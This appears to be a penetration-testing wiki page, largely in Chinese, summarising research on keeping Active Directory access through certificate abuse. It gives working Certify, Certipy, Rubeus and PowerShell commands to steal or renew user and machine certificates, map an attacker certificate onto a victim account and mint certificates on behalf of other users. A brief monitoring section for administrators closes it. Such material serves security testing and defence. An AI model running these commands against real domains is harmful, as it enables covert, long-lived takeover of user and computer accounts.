# AD CS Account Persistence

{{#include ../../../banners/hacktricks-training.md}}

**这是对来自 [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf) 的精彩研究中帐号持久化章节的简要总结**

## 理解使用证书进行主动用户凭证窃取 – PERSIST1

在某些情形下，如果用户可以申请允许域身份验证的证书，攻击者就有机会申请并窃取该证书，从而在网络上保持持久性。默认情况下，Active Directory 中的 `User` 模板允许此类申请，但有时可能被禁用。

使用 [Certify](https://github.com/GhostPack/Certify) 或 [Certipy](https://github.com/ly4k/Certipy)，你可以搜索已启用且允许客户端认证的模板，然后请求其中一个：
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
证书的威力在于它能够以其所属用户的身份进行认证，只要证书仍然有效，就不受密码更改的影响。

你可以将 PEM 转换为 PFX 并使用它来获取 TGT：
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> 注意：结合其他技术（参见 THEFT 部分），基于证书的认证允许在不接触 LSASS 的情况下维持持久访问，甚至可以在非提升权限的上下文中实现。

## 使用证书获得主机持久性 - PERSIST2

如果攻击者在主机上拥有提升权限，他们可以使用默认的 `Machine` 模板为被入侵系统的机器账户申请证书。以机器身份进行身份验证可以为本地服务启用 S4U2Self，并可在主机上实现长期持久性：
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## 通过证书续期扩展持久性 - PERSIST3

滥用证书模板的有效期和续期周期可以让攻击者维持长期访问。如果你持有先前签发的证书及其私钥，可以在到期前对其进行续期，从而获得新的长期有效凭证，而不会留下与原始主体相关的额外请求痕迹。
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> 操作提示：跟踪攻击者持有的 PFX 文件的有效期并尽早续期。续期也可能导致更新后的证书包含现代 SID 映射扩展，从而在更严格的 DC 映射规则下仍然可用（见下一节）。

## Planting Explicit Certificate Mappings (altSecurityIdentities) – PERSIST4

如果你可以写入目标帐户的 `altSecurityIdentities` 属性，你就可以将一个攻击者控制的证书显式映射到该帐户。这种映射在密码更改后仍然存在，并且在使用强映射格式时，在现代 DC 强制下仍能正常工作。

High-level flow:

1. Obtain or issue a client-auth certificate you control (e.g., enroll `User` template as yourself).
2. Extract a strong identifier from the cert (Issuer+Serial, SKI, or SHA1-PublicKey).
3. Add an explicit mapping on the victim principal’s `altSecurityIdentities` using that identifier.
4. Authenticate with your certificate; the DC maps it to the victim via the explicit mapping.

Example (PowerShell) using a strong Issuer+Serial mapping:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
然后使用你的 PFX 进行身份验证。Certipy 将直接获取一个 TGT：
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### 构建强健的 `altSecurityIdentities` 映射

实际上，**Issuer+Serial** 和 **SKI** 映射是从攻击者持有的证书构建强映射的最简单格式。这在 **2025年2月11日** 之后尤为重要，因为 DCs 默认进入 **Full Enforcement**，弱映射将不再可靠。
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
Notes
- 只使用强映射类型：`X509IssuerSerialNumber`、`X509SKI` 或 `X509SHA1PublicKey`。弱格式（Subject/Issuer、Subject-only、RFC822 email）已弃用，可能被 DC 策略阻止。
- 该映射对 **user** 和 **computer** 对象均有效，因此对计算机帐户的 `altSecurityIdentities` 具有写权限就足以以该机器身份持久化。
- 证书链必须能够建立到由 DC 信任的根。NTAuth 中的 Enterprise CAs 通常是受信任的；某些环境也信任公有 CAs。
- 即使 PKINIT 因 DC 缺少 Smart Card Logon EKU 或返回 `KDC_ERR_PADATA_TYPE_NOSUPP` 而失败，Schannel 认证仍然对持久化有用。

For more on weak explicit mappings and attack paths, see:


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent as Persistence – PERSIST5

If you obtain a valid Certificate Request Agent/Enrollment Agent certificate, you can mint new logon-capable certificates on behalf of users at will and keep the agent PFX offline as a persistence token. Abuse workflow:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
必须撤销代理证书或模板权限才能清除此类持久性。

Operational notes
- 较新的 `Certipy` 版本同时支持 `-on-behalf-of` 和 `-renew`，因此持有 Enrollment Agent PFX 的攻击者可以铸造并随后续签叶证书，而无需重新接触原始目标账户。
- 如果基于 PKINIT 的 TGT 获取不可行，生成的 on-behalf-of 证书仍可用于 Schannel 验证，示例：`certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`。

## 2025 Strong Certificate Mapping Enforcement: Impact on Persistence

Microsoft KB5014754 在域控制器上引入了 Strong Certificate Mapping Enforcement。自 2025 年 2 月 11 日起，DC 默认为 Full Enforcement，拒绝弱/模糊的映射。实际影响：

- 在 DC 处于 Full Enforcement 时，缺少 SID 映射扩展的 2022 年之前的证书可能会导致隐式映射失败。攻击者可以通过两种方式维持访问：通过 AD CS 续签证书（以获得 SID 扩展），或在 `altSecurityIdentities` 中植入强显式映射（PERSIST4）。
- 使用强格式（Issuer+Serial、SKI、SHA1-PublicKey）的显式映射仍然有效。弱格式（Issuer/Subject、仅 Subject、RFC822）可能被阻止，应避免用于持久化。

Administrators should monitor and alert on:
- `altSecurityIdentities` 的更改以及 Enrollment Agent 和 User 证书的签发/续签。
- CA 签发日志中的 on-behalf-of 请求以及异常的续签模式。

## References

- Microsoft. KB5014754: Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings).
https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- SpecterOps. ADCS ESC14 Abuse Technique (explicit `altSecurityIdentities` abuse on user/computer objects).
https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/
- Certipy Wiki – Command Reference (`req -renew`, `auth`, `shadow`).
https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
- Almond Offensive Security. Authenticating with certificates when PKINIT is not supported.
https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html

{{#include ../../../banners/hacktricks-training.md}}
